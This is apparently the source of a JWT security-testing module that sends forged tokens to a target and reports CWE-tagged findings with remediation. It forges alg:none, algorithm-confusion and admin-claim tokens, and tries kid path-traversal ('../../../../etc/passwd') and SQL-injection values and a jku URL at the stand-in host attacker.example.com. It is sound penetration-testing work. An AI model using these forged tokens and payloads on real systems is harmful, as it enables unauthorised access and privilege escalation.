"""
jwt_attacks.py — Comprehensive JWT security testing module for HaakAuth.

Tests implemented:
  1. Algorithm None Attack                   (CWE-345)
  2. Algorithm Confusion  RS256 → HS256      (CWE-327)
  3. Expired Token Replay                    (CWE-613)
  4. Claim Tampering / Privilege Escalation  (CWE-284)
  5. Missing / Empty Signature               (CWE-345)
  6. JWT Header Injection (kid / jku / x5u)  (CWE-94)
  7. Blank / Null Token                      (CWE-306)
  8. Token in Alternative Locations          (CWE-346)

No PyJWT or any JWT library — only stdlib + requests.
"""
from __future__ import annotations

import base64
import hashlib
import hmac
import json
import re
import time
from typing import Optional
from urllib.parse import parse_qs, urlencode, urlparse, urlunparse

from requests import Response

from auth_tester.core import AuthTester, BaseModule
from auth_tester.colors import (
    msg_fail, msg_info, msg_ok, msg_vuln, msg_warn, progress_bar, section,
)


# ─────────────────────────────────────────────────────────────────────────────
# Low-level JWT helpers (zero external deps)
# ─────────────────────────────────────────────────────────────────────────────

def base64url_decode(data: str) -> bytes:
    """Decode a Base64url-encoded string.  Padding is added automatically."""
    data = data.replace("-", "+").replace("_", "/")
    pad = (4 - len(data) % 4) % 4
    return base64.b64decode(data + "=" * pad)


def base64url_encode(data: bytes) -> str:
    """Encode bytes as Base64url without padding characters."""
    return base64.b64encode(data).decode().rstrip("=").replace("+", "-").replace("/", "_")


def decode_jwt(token: str) -> tuple[dict, dict, str]:
    """
    Decode a JWT **without** signature verification.

    Returns:
        (header_dict, payload_dict, raw_signature_segment)
    Raises:
        ValueError on malformed input.
    """
    parts = token.split(".")
    if len(parts) < 2:
        raise ValueError(f"Malformed JWT: expected ≥2 segments, got {len(parts)}")
    try:
        header: dict = json.loads(base64url_decode(parts[0]))
    except Exception as exc:
        raise ValueError(f"Cannot decode JWT header: {exc}") from exc
    try:
        payload: dict = json.loads(base64url_decode(parts[1]))
    except Exception as exc:
        raise ValueError(f"Cannot decode JWT payload: {exc}") from exc
    signature = parts[2] if len(parts) >= 3 else ""
    return header, payload, signature


def encode_jwt_no_sig(header: dict, payload: dict) -> str:
    """
    Encode a JWT with the given header and payload.
    The signature segment is intentionally **empty**  →  ``header.payload.``
    """
    h = base64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = base64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    return f"{h}.{p}."


def encode_jwt_hs256(header: dict, payload: dict, key: bytes) -> str:
    """Build a properly HS256-signed JWT token."""
    h = base64url_encode(json.dumps(header, separators=(",", ":")).encode())
    p = base64url_encode(json.dumps(payload, separators=(",", ":")).encode())
    signing_input = f"{h}.{p}".encode()
    sig = hmac.new(key, signing_input, hashlib.sha256).digest()
    return f"{h}.{p}.{base64url_encode(sig)}"


# ─────────────────────────────────────────────────────────────────────────────
# Misc helpers
# ─────────────────────────────────────────────────────────────────────────────

def _success(resp: Response) -> bool:
    return resp.status_code < 400


def _body(resp: Response, limit: int = 300) -> str:
    try:
        return resp.text[:limit].replace("\n", " ")
    except Exception:
        return "<undecodable>"


def _evidence(label: str, token: str, resp: Response) -> str:
    return (
        f"[{label}]\n"
        f"  Token (first 80): {token[:80]}…\n"
        f"  Status: {resp.status_code}\n"
        f"  Body: {_body(resp)}"
    )


# ─────────────────────────────────────────────────────────────────────────────
# JWTModule
# ─────────────────────────────────────────────────────────────────────────────

class JWTModule(BaseModule):
    """Comprehensive JWT security testing (8 test categories)."""

    NAME        = "jwt_attacks"
    DESCRIPTION = (
        "Tests JWTs for algorithm confusion, claim tampering, missing signature "
        "validation, header injection, blank tokens, and more."
    )
    _TOTAL_TESTS = 8

    def __init__(self, tester: AuthTester, options: Optional[dict] = None):
        super().__init__(tester, options)
        # Populated in run() after extraction
        self._token: str = ""
        self._header: dict = {}
        self._payload: dict = {}
        self._signature: str = ""
        self._original_resp: Optional[Response] = None
        self._done = 0  # progress counter

    # ─────────────────────────────────────────────────────────────────────────
    # Token extraction
    # ─────────────────────────────────────────────────────────────────────────

    def _extract_token(self) -> Optional[str]:
        """
        Look for a JWT in (priority order):
          1. ``options["token"]``               – explicitly supplied
          2. Session ``Authorization: Bearer …`` header
          3. Any cookie whose value looks like a JWT
        """
        # 1. Explicit option
        if self.options.get("token"):
            return self.options["token"].strip()

        # 2. Authorization header already on the session
        auth = self.tester.session.headers.get("Authorization", "")
        if auth.lower().startswith("bearer "):
            candidate = auth[7:].strip()
            if candidate.count(".") == 2:
                return candidate

        # 3. Cookies
        for _name, value in self.tester.session.cookies.items():
            if isinstance(value, str) and value.count(".") == 2:
                parts = value.split(".")
                if all(re.match(r"^[A-Za-z0-9\-_]*$", p) for p in parts):
                    return value

        return None

    # ─────────────────────────────────────────────────────────────────────────
    # HTTP helpers
    # ─────────────────────────────────────────────────────────────────────────

    def _get_with_token(self, token: str, **kwargs) -> Response:
        """GET target_url injecting *token* as Bearer."""
        hdrs = dict(self.tester.session.headers)
        hdrs["Authorization"] = f"Bearer {token}"
        return self.tester.get(self.tester.target_url, headers=hdrs, **kwargs)

    def _get_without_auth(self, extra_headers: Optional[dict] = None,
                          cookies: Optional[dict] = None,
                          url: Optional[str] = None) -> Response:
        """GET stripping the Authorization header from the session."""
        hdrs = {k: v for k, v in self.tester.session.headers.items()
                if k.lower() != "authorization"}
        if extra_headers:
            hdrs.update(extra_headers)
        return self.tester.get(
            url or self.tester.target_url,
            headers=hdrs,
            cookies=cookies or {},
        )

    def _tick(self, label: str) -> None:
        self._done += 1
        progress_bar(self._done, self._TOTAL_TESTS, label)

    # ─────────────────────────────────────────────────────────────────────────
    # Baseline
    # ─────────────────────────────────────────────────────────────────────────

    def _baseline(self) -> Optional[Response]:
        try:
            resp = self.tester.get(self.tester.target_url)
            level = "ok" if _success(resp) else "warn"
            fn = msg_ok if level == "ok" else msg_warn
            fn(f"Baseline: {resp.status_code} — token is {'valid' if _success(resp) else 'already rejected'}")
            return resp
        except Exception as exc:
            msg_warn(f"Baseline request failed: {exc}")
            return None

    # ─────────────────────────────────────────────────────────────────────────
    # Test 1 — Algorithm None
    # ─────────────────────────────────────────────────────────────────────────

    def _test_alg_none(self) -> None:
        msg_info("Test 1/8: Algorithm None Attack")
        alg_variants = ["none", "None", "NONE", "nOnE"]

        for alg in alg_variants:
            hdr = {**self._header, "alg": alg}
            token = encode_jwt_no_sig(hdr, self._payload)
            try:
                resp = self._get_with_token(token, allow_redirects=False)
                if _success(resp):
                    msg_vuln("critical", f"alg:{alg!r} accepted → {resp.status_code}")
                    self.finding(
                        severity="critical",
                        title=f"JWT Algorithm None Accepted (alg={alg!r})",
                        description=(
                            "The server accepted a JWT whose 'alg' claim is set to 'none', "
                            "meaning it performed no signature verification whatsoever. "
                            "An attacker can forge arbitrary tokens by stripping the signature "
                            "and setting alg:none."
                        ),
                        evidence=_evidence(f"alg={alg}", token, resp),
                        cwe="CWE-345",
                        remediation=(
                            "Explicitly reject tokens with alg:none in the JWT validation library. "
                            "Maintain an allowlist of accepted algorithms and never accept unsigned tokens."
                        ),
                        request_data=self._request_data(
                            "GET", self.tester.target_url,
                            {"Authorization": f"Bearer {token[:60]}…"}),
                        response_data=self._response_data(resp),
                        references=[
                            "https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/",
                            "https://cwe.mitre.org/data/definitions/345.html",
                        ],
                    )
                    self._tick("alg:none"); return
                else:
                    msg_fail(f"  alg:{alg!r} rejected → {resp.status_code}")
            except Exception as exc:
                msg_warn(f"  alg:{alg!r} request error: {exc}")

        msg_ok("Algorithm None: all variants rejected correctly")
        self._tick("alg:none")

    # ─────────────────────────────────────────────────────────────────────────
    # Test 2 — Algorithm Confusion RS256 → HS256
    # ─────────────────────────────────────────────────────────────────────────

    def _test_alg_confusion(self) -> None:
        msg_info("Test 2/8: Algorithm Confusion (RS256 → HS256)")
        alg = self._header.get("alg", "").upper()

        asymmetric = {"RS256", "RS384", "RS512", "ES256", "ES384", "ES512", "PS256"}
        if alg not in asymmetric:
            msg_info(f"  Token uses {alg or '?'} — not asymmetric, skipping")
            self._tick("alg confusion"); return

        # Variant A: HS256 with empty / no signature
        hdr = {**self._header, "alg": "HS256"}
        token_empty = encode_jwt_no_sig(hdr, self._payload)
        try:
            resp = self._get_with_token(token_empty, allow_redirects=False)
            if _success(resp):
                msg_vuln("critical", f"HS256 with empty sig accepted → {resp.status_code}")
                self.finding(
                    severity="critical",
                    title="JWT Algorithm Confusion: RS256 → HS256 (Empty Signature)",
                    description=(
                        f"The original token uses {alg}. The server accepted a token with "
                        "alg switched to HS256 and no valid signature, allowing complete "
                        "token forgery without the private key."
                    ),
                    evidence=_evidence("alg confusion empty sig", token_empty, resp),
                    cwe="CWE-327",
                    remediation=(
                        "Pin the expected algorithm server-side. Never allow the client to "
                        "dictate the validation algorithm. Use an explicit allowlist."
                    ),
                    request_data=self._request_data(
                        "GET", self.tester.target_url,
                        {"Authorization": f"Bearer {token_empty[:60]}…"}),
                    response_data=self._response_data(resp),
                    references=["https://portswigger.net/web-security/jwt/algorithm-confusion"],
                )
                self._tick("alg confusion"); return
            else:
                msg_fail(f"  HS256+empty sig rejected → {resp.status_code}")
        except Exception as exc:
            msg_warn(f"  HS256 empty-sig error: {exc}")

        # Variant B: signed with the public key as HMAC secret (requires --jwt-public-key)
        pubkey_path: Optional[str] = self.options.get("jwt_public_key")
        if pubkey_path:
            try:
                with open(pubkey_path, "rb") as fh:
                    pubkey_bytes = fh.read()
                hdr2 = {**self._header, "alg": "HS256"}
                token_signed = encode_jwt_hs256(hdr2, self._payload, pubkey_bytes)
                resp2 = self._get_with_token(token_signed, allow_redirects=False)
                if _success(resp2):
                    msg_vuln("critical", f"HS256+public-key sig accepted → {resp2.status_code}")
                    self.finding(
                        severity="critical",
                        title="JWT Algorithm Confusion: RS256 Public Key Used as HS256 Secret",
                        description=(
                            "Classic CVE-2015-9235 pattern. The RS256 public key was used as "
                            "the HMAC-SHA256 secret and the server accepted the resulting token."
                        ),
                        evidence=_evidence("hs256+pubkey", token_signed, resp2),
                        cwe="CWE-327",
                        remediation=(
                            "Reject HS256 tokens when the service is configured for RS256. "
                            "Algorithm must be verified before the signature is checked."
                        ),
                        request_data=self._request_data(
                            "GET", self.tester.target_url,
                            {"Authorization": f"Bearer {token_signed[:60]}…"}),
                        response_data=self._response_data(resp2),
                        references=["https://auth0.com/blog/critical-vulnerabilities-in-json-web-token-libraries/"],
                    )
                    self._tick("alg confusion"); return
                else:
                    msg_fail(f"  HS256+pubkey rejected → {resp2.status_code}")
            except FileNotFoundError:
                msg_warn(f"  Public key not found at {pubkey_path!r}")
            except Exception as exc:
                msg_warn(f"  HS256+pubkey error: {exc}")
        else:
            msg_info("  No --jwt-public-key provided; signed variant skipped")

        msg_ok("Algorithm confusion: all HS256 variants rejected")
        self._tick("alg confusion")

    # ─────────────────────────────────────────────────────────────────────────
    # Test 3 — Expired Token Replay
    # ─────────────────────────────────────────────────────────────────────────

    def _test_expired_replay(self) -> None:
        msg_info("Test 3/8: Expired Token Replay")
        now = int(time.time())
        exp = self._payload.get("exp")

        if exp is not None and int(exp) < now:
            # Token is already expired — test if the server still accepts it
            delta = now - int(exp)
            msg_info(f"  Token already expired {delta}s ago — sending original")
            try:
                resp = self._get_with_token(self._token, allow_redirects=False)
                if _success(resp):
                    msg_vuln("high", f"Expired token accepted (expired {delta}s ago) → {resp.status_code}")
                    self.finding(
                        severity="high",
                        title="Expired JWT Accepted (Token Replay)",
                        description=(
                            f"The server accepted a token whose exp={exp} indicates it "
                            f"expired {delta} seconds ago. This enables token replay attacks."
                        ),
                        evidence=(
                            f"exp={exp}  now={now}  delta={delta}s\n"
                            f"Status: {resp.status_code}\nBody: {_body(resp)}"
                        ),
                        cwe="CWE-613",
                        remediation=(
                            "Enforce exp validation on every request. Keep access-token "
                            "lifetimes short (≤15 min) and implement token revocation."
                        ),
                        response_data=self._response_data(resp),
                        references=["https://cwe.mitre.org/data/definitions/613.html"],
                    )
                else:
                    msg_ok(f"  Expired token rejected → {resp.status_code}")
            except Exception as exc:
                msg_warn(f"  Expired replay error: {exc}")
        else:
            # Token is valid — craft one with exp 24 h in the past
            past_exp = now - 86400
            tampered = {**self._payload, "exp": past_exp}
            token = encode_jwt_no_sig(self._header, tampered)
            msg_info(f"  Crafting token with exp={past_exp} (24 h ago)")
            try:
                resp = self._get_with_token(token, allow_redirects=False)
                if _success(resp):
                    msg_vuln("high", f"Token with past exp accepted → {resp.status_code}")
                    self.finding(
                        severity="high",
                        title="JWT Expiration Claim Not Enforced",
                        description=(
                            "A JWT with the exp claim set to 24 hours in the past was accepted. "
                            "The server does not validate token expiration."
                        ),
                        evidence=_evidence(f"exp={past_exp}", token, resp),
                        cwe="CWE-613",
                        remediation=(
                            "Validate the exp claim on every request. Accept at most 60 s of "
                            "clock-skew tolerance."
                        ),
                        request_data=self._request_data(
                            "GET", self.tester.target_url,
                            {"Authorization": f"Bearer {token[:60]}…"}),
                        response_data=self._response_data(resp),
                        references=["https://cwe.mitre.org/data/definitions/613.html"],
                    )
                else:
                    msg_ok(f"  Past-exp token rejected → {resp.status_code}")
            except Exception as exc:
                msg_warn(f"  Past-exp test error: {exc}")

        self._tick("exp replay")

    # ─────────────────────────────────────────────────────────────────────────
    # Test 4 — Claim Tampering
    # ─────────────────────────────────────────────────────────────────────────

    def _test_claim_tampering(self) -> None:
        msg_info("Test 4/8: Claim Tampering / Privilege Escalation")
        base = dict(self._payload)
        mutations: list[dict] = []

        # Modify existing claims
        for fld, new_val in [
            ("role",     "admin"),
            ("roles",    ["admin"]),
            ("is_admin", True),
            ("admin",    True),
            ("email",    "admin@target.com"),
            ("scope",    "admin openid profile"),
        ]:
            if fld in base:
                m = dict(base); m[fld] = new_val; mutations.append(m)

        # Escalate numeric user IDs to 1
        for id_fld in ("user_id", "userId", "uid", "id", "sub"):
            if id_fld in base and str(base[id_fld]).isdigit():
                m = dict(base); m[id_fld] = 1; mutations.append(m)

        # Additive privilege injections (always run)
        for extra in [
            {"admin": True},
            {"role": "admin"},
            {"roles": ["admin"]},
            {"groups": ["admin", "superuser"]},
            {"scope": "admin"},
            {"is_superuser": True},
        ]:
            m = dict(base); m.update(extra); mutations.append(m)

        if not mutations:
            msg_info("  No obvious tamperable claims — applying additive injections only")

        found = False
        for tampered in mutations:
            token = encode_jwt_no_sig(self._header, tampered)
            try:
                resp = self._get_with_token(token, allow_redirects=False)
                if _success(resp):
                    diff = {k: v for k, v in tampered.items() if base.get(k) != v}
                    msg_vuln("critical", f"Claim tampering accepted! changed={diff} → {resp.status_code}")
                    self.finding(
                        severity="critical",
                        title="JWT Claim Tampering Accepted",
                        description=(
                            f"Modifying payload claims {diff} produced a valid authenticated "
                            "response. The server either does not verify the JWT signature or "
                            "has a broken verification code path."
                        ),
                        evidence=(
                            f"Original: {self._payload}\n"
                            f"Tampered: {tampered}\n"
                            f"Status: {resp.status_code}  Body: {_body(resp)}"
                        ),
                        cwe="CWE-284",
                        remediation=(
                            "Always validate JWT signatures server-side before trusting any claim. "
                            "Do not short-circuit signature verification for any code path."
                        ),
                        request_data=self._request_data(
                            "GET", self.tester.target_url,
                            {"Authorization": f"Bearer {token[:60]}…"}),
                        response_data=self._response_data(resp),
                        references=["https://cwe.mitre.org/data/definitions/284.html"],
                    )
                    found = True; break
                else:
                    msg_fail(f"  Tampered claims rejected → {resp.status_code}")
            except Exception as exc:
                msg_warn(f"  Claim tamper error: {exc}")

        if not found:
            msg_ok("Claim tampering: all mutations rejected correctly")
        self._tick("claim tamper")

    # ─────────────────────────────────────────────────────────────────────────
    # Test 5 — Missing / Empty Signature
    # ─────────────────────────────────────────────────────────────────────────

    def _test_missing_signature(self) -> None:
        msg_info("Test 5/8: Missing / Empty Signature")
        parts = self._token.split(".")
        h, p = parts[0], parts[1]
        orig_sig = parts[2] if len(parts) >= 3 else ""

        variants = {
            "empty_sig":     f"{h}.{p}.",
            "no_third_part": f"{h}.{p}",
            "four_null_bytes": f"{h}.{p}.AAAA",
            "truncated_sig":   f"{h}.{p}.{orig_sig[:max(1, len(orig_sig)//2)]}",
        }

        found = False
        for label, token in variants.items():
            try:
                resp = self._get_with_token(token, allow_redirects=False)
                if _success(resp):
                    msg_vuln("critical", f"Signature variant {label!r} accepted → {resp.status_code}")
                    self.finding(
                        severity="critical",
                        title=f"JWT Accepted Without Valid Signature ({label})",
                        description=(
                            f"The server accepted a JWT with a '{label.replace('_', ' ')}' "
                            "instead of a valid cryptographic signature. "
                            "Signature verification is absent or can be bypassed."
                        ),
                        evidence=_evidence(label, token, resp),
                        cwe="CWE-345",
                        remediation=(
                            "Enforce mandatory signature validation. Reject tokens that lack "
                            "the signature segment entirely or contain a truncated signature."
                        ),
                        request_data=self._request_data(
                            "GET", self.tester.target_url,
                            {"Authorization": f"Bearer {token[:60]}…"}),
                        response_data=self._response_data(resp),
                        references=["https://cwe.mitre.org/data/definitions/345.html"],
                    )
                    found = True; break
                else:
                    msg_fail(f"  Variant {label!r} rejected → {resp.status_code}")
            except Exception as exc:
                msg_warn(f"  Variant {label!r} error: {exc}")

        if not found:
            msg_ok("Missing/empty signature: all variants rejected correctly")
        self._tick("missing sig")

    # ─────────────────────────────────────────────────────────────────────────
    # Test 6 — JWT Header Injection (kid / jku / x5u)
    # ─────────────────────────────────────────────────────────────────────────

    def _test_header_injection(self) -> None:
        msg_info("Test 6/8: JWT Header Injection (kid / jku / x5u)")
        attacker_url = self.options.get(
            "attacker_jwks_url",
            "http://attacker.example.com/.well-known/jwks.json",
        )

        # --- kid payloads ---
        kid_payloads = [
            ("path_traversal",  "../../dev/null"),
            ("dev_null",        "/dev/null"),
            ("sqli_or",         "' OR '1'='1"),
            ("sqli_comment",    "x'; SELECT 1 --"),
            ("etc_passwd",      "../../../../etc/passwd"),
        ]
        found = False

        for label, kid_val in kid_payloads:
            hdr = {**self._header, "kid": kid_val}
            token = encode_jwt_no_sig(hdr, self._payload)
            try:
                resp = self._get_with_token(token, allow_redirects=False)
                if _success(resp):
                    msg_vuln("high", f"kid injection accepted: {label!r} → {resp.status_code}")
                    self.finding(
                        severity="high",
                        title=f"JWT kid Header Injection ({label})",
                        description=(
                            f"A JWT with kid={kid_val!r} was accepted. "
                            "Path traversal in kid may let the server read an empty / attacker-"
                            "controlled file as the key, or SQL injection may corrupt key lookup."
                        ),
                        evidence=_evidence(f"kid={kid_val}", token, resp),
                        cwe="CWE-94",
                        remediation=(
                            "Sanitize the kid claim. Use an explicit key-ID → key mapping "
                            "stored server-side; never perform FS lookups from client data."
                        ),
                        request_data=self._request_data(
                            "GET", self.tester.target_url,
                            {"Authorization": f"Bearer {token[:60]}…"}),
                        response_data=self._response_data(resp),
                        references=[
                            "https://portswigger.net/web-security/jwt",
                            "https://cwe.mitre.org/data/definitions/94.html",
                        ],
                    )
                    found = True; break
                else:
                    msg_fail(f"  kid={kid_val!r} rejected → {resp.status_code}")
            except Exception as exc:
                msg_warn(f"  kid injection error: {exc}")

        # --- jku injection ---
        hdr_jku = {**self._header, "jku": attacker_url}
        token_jku = encode_jwt_no_sig(hdr_jku, self._payload)
        try:
            resp = self._get_with_token(token_jku, allow_redirects=False)
            if _success(resp):
                msg_vuln("critical", f"jku injection accepted → {resp.status_code}")
                self.finding(
                    severity="critical",
                    title="JWT jku Header Injection (SSRF / Key Forgery)",
                    description=(
                        f"The server accepted a JWT with jku={attacker_url!r}. "
                        "If the server fetched that URL, an attacker can host a custom JWKS "
                        "and sign tokens that the server will accept."
                    ),
                    evidence=_evidence(f"jku={attacker_url}", token_jku, resp),
                    cwe="CWE-94",
                    remediation=(
                        "Never resolve jku/x5u URLs from client-supplied JWTs. "
                        "Fetch keys only from a static, server-configured JWKS endpoint."
                    ),
                    request_data=self._request_data(
                        "GET", self.tester.target_url,
                        {"Authorization": f"Bearer {token_jku[:60]}…"}),
                    response_data=self._response_data(resp),
                    references=["https://portswigger.net/web-security/jwt/algorithm-confusion#jwk-injection"],
                )
                found = True
            else:
                msg_fail(f"  jku injection rejected → {resp.status_code}")
        except Exception as exc:
            msg_warn(f"  jku injection error: {exc}")

        # --- x5u injection ---
        x5u_url = attacker_url.replace("jwks.json", "x5u.pem")
        hdr_x5u = {**self._header, "x5u": x5u_url}
        token_x5u = encode_jwt_no_sig(hdr_x5u, self._payload)
        try:
            resp = self._get_with_token(token_x5u, allow_redirects=False)
            if _success(resp):
                msg_vuln("high", f"x5u injection accepted → {resp.status_code}")
                self.finding(
                    severity="high",
                    title="JWT x5u Header Injection",
                    description=(
                        "A JWT with an attacker-controlled x5u certificate URL was accepted. "
                        "The server may load X.509 certificates from attacker-controlled locations."
                    ),
                    evidence=_evidence(f"x5u={x5u_url}", token_x5u, resp),
                    cwe="CWE-94",
                    remediation="Ignore jku and x5u headers in received JWTs; use preconfigured key material.",
                    request_data=self._request_data(
                        "GET", self.tester.target_url,
                        {"Authorization": f"Bearer {token_x5u[:60]}…"}),
                    response_data=self._response_data(resp),
                )
                found = True
            else:
                msg_fail(f"  x5u injection rejected → {resp.status_code}")
        except Exception as exc:
            msg_warn(f"  x5u injection error: {exc}")

        if not found:
            msg_ok("Header injection: all kid/jku/x5u variants rejected")
        self._tick("header injection")

    # ─────────────────────────────────────────────────────────────────────────
    # Test 7 — Blank / Null Token
    # ─────────────────────────────────────────────────────────────────────────

    def _test_blank_token(self) -> None:
        msg_info("Test 7/8: Blank / Null Token")

        # Each entry: (label, extra_header_dict)
        # All of them send *without* the original auth token
        variants: list[tuple[str, dict]] = [
            ("no_auth_header",   {}),
            ("empty_bearer",     {"Authorization": "Bearer "}),
            ("null_string",      {"Authorization": "Bearer null"}),
            ("undefined_string", {"Authorization": "Bearer undefined"}),
            ("none_string",      {"Authorization": "Bearer none"}),
            ("empty_string",     {"Authorization": ""}),
        ]

        found = False
        for label, extra_hdrs in variants:
            try:
                resp = self._get_without_auth(extra_headers=extra_hdrs)
                if _success(resp):
                    msg_vuln("critical", f"Unauthenticated access! {label} → {resp.status_code}")
                    self.finding(
                        severity="critical",
                        title=f"Endpoint Accessible Without Valid Token ({label})",
                        description=(
                            f"Sending the request with '{label.replace('_', ' ')}' returned "
                            f"HTTP {resp.status_code}. The endpoint appears to be publicly "
                            "accessible or authentication is not enforced."
                        ),
                        evidence=(
                            f"Variant: {label}\n"
                            f"Headers sent: {extra_hdrs}\n"
                            f"Status: {resp.status_code}  Body: {_body(resp)}"
                        ),
                        cwe="CWE-306",
                        remediation=(
                            "Enforce authentication on all protected endpoints. Validate that "
                            "the Authorization header is present, non-empty, and carries a "
                            "cryptographically valid token."
                        ),
                        request_data=self._request_data(
                            "GET", self.tester.target_url, extra_hdrs),
                        response_data=self._response_data(resp),
                        references=["https://cwe.mitre.org/data/definitions/306.html"],
                    )
                    found = True
                else:
                    msg_fail(f"  {label!r} rejected → {resp.status_code}")
            except Exception as exc:
                msg_warn(f"  Blank token {label!r} error: {exc}")

        if not found:
            msg_ok("Blank/null tokens: all variants rejected as expected")
        self._tick("blank token")

    # ─────────────────────────────────────────────────────────────────────────
    # Test 8 — Token in Alternative Locations
    # ─────────────────────────────────────────────────────────────────────────

    def _test_token_locations(self) -> None:
        msg_info("Test 8/8: Token in Alternative Locations")
        token = self._token

        # Build URL with token embedded in query string
        parsed = urlparse(self.tester.target_url)
        qs = parse_qs(parsed.query)
        for qname in ("token", "access_token", "jwt", "auth", "bearer"):
            qs_copy = {**qs, qname: [token]}
            url_q = urlunparse(parsed._replace(
                query=urlencode({k: v[0] for k, v in qs_copy.items()})
            ))
            break  # one query-param variant is enough for the initial test
        else:
            url_q = self.tester.target_url

        # (label, url, cookie_dict)
        location_tests: list[tuple[str, str, dict]] = [
            ("query_param_token",   url_q,                     {}),
            ("cookie_token",        self.tester.target_url,    {"token": token}),
            ("cookie_jwt",          self.tester.target_url,    {"jwt": token}),
            ("cookie_access_token", self.tester.target_url,    {"access_token": token}),
            ("cookie_authorization",self.tester.target_url,    {"Authorization": token}),
        ]

        found = False
        for label, url, cookies in location_tests:
            try:
                resp = self._get_without_auth(cookies=cookies, url=url)
                if _success(resp):
                    msg_vuln("medium", f"Token accepted from {label} → {resp.status_code}")
                    self.finding(
                        severity="medium",
                        title=f"JWT Accepted From Alternative Location ({label})",
                        description=(
                            f"The server accepted the JWT from '{label.replace('_', ' ')}' "
                            "instead of (or in addition to) the Authorization header. "
                            "This broadens the attack surface for token theft via logs, "
                            "Referer headers, or cookie theft."
                        ),
                        evidence=(
                            f"Location: {label}\nURL: {url[:140]}\n"
                            f"Cookies: {cookies}\nStatus: {resp.status_code}"
                        ),
                        cwe="CWE-346",
                        remediation=(
                            "Accept tokens only from the Authorization header. "
                            "Avoid cookie-based JWT delivery unless explicitly required, "
                            "and apply CSRF protections if you do."
                        ),
                        request_data=self._request_data("GET", url, {}),
                        response_data=self._response_data(resp),
                        references=["https://cwe.mitre.org/data/definitions/346.html"],
                    )
                    found = True
                else:
                    msg_fail(f"  {label!r} rejected → {resp.status_code}")
            except Exception as exc:
                msg_warn(f"  Token location {label!r} error: {exc}")

        if not found:
            msg_ok("Token locations: server only accepts token from Authorization header")
        self._tick("token location")

    # ─────────────────────────────────────────────────────────────────────────
    # run()
    # ─────────────────────────────────────────────────────────────────────────

    def run(self) -> None:
        section(f"Module: {self.NAME}")
        msg_info(f"Target : {self.tester.target_url}")

        # 1. Extract token
        raw_token = self._extract_token()
        if not raw_token:
            msg_warn("No JWT found in Authorization header, cookies, or options — module aborted")
            return

        # 2. Decode token
        try:
            self._header, self._payload, self._signature = decode_jwt(raw_token)
            self._token = raw_token
        except ValueError as exc:
            msg_warn(f"JWT decode failed: {exc}")
            return

        # 3. Display token info
        alg = self._header.get("alg", "?")
        typ = self._header.get("typ", "JWT")
        iss = self._payload.get("iss", "-")
        sub = self._payload.get("sub", "-")
        exp = self._payload.get("exp")
        now = int(time.time())
        if exp is None:
            exp_info = "no exp claim — token never expires"
        elif int(exp) < now:
            exp_info = f"{exp} (EXPIRED {now - int(exp)}s ago)"
        else:
            exp_info = f"{exp} (valid for {int(exp) - now}s)"

        msg_info(f"alg={alg}  typ={typ}  iss={iss}  sub={sub}")
        msg_info(f"exp: {exp_info}")
        msg_info(f"Header  : {json.dumps(self._header)}")
        msg_info(f"Payload : {json.dumps(self._payload)}")

        # 4. Baseline authenticated request
        self._original_resp = self._baseline()

        # 5. Run all 8 tests
        self._test_alg_none()
        self._test_alg_confusion()
        self._test_expired_replay()
        self._test_claim_tampering()
        self._test_missing_signature()
        self._test_header_injection()
        self._test_blank_token()
        self._test_token_locations()

        msg_info(
            f"JWT module complete — {self.tester.request_count} total requests, "
            f"{len(self.tester.get_findings())} total findings so far"
        )
